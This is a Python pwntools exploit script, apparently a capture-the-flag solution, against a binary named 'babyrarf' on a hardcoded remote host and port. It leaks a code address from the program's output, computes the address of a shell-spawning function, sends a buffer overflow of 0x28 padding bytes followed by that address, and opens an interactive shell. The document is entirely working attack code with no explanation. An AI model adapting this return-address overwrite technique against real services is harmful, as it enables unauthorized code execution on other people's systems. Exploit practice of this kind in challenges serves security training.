#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '35.204.248.202', 1337
binary = './babyrarf'
brkpts = '''
'''

elf = ELF("babyrarf")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

shell = 0x5555555551d7

if __name__ == "__main__":
    sla("What is your name?\n", "a")
    for i in range(10):
        sla("4. A cr0wn\n","1")
    sla("4. A cr0wn\n","4")
    reu("You choose attack ")
    shell = int(rl()) - 0x2f9
    #gdb.attach(io)
    payload = "a"*0x28
    payload += p64(shell)
    sl(payload)
    io.interactive()
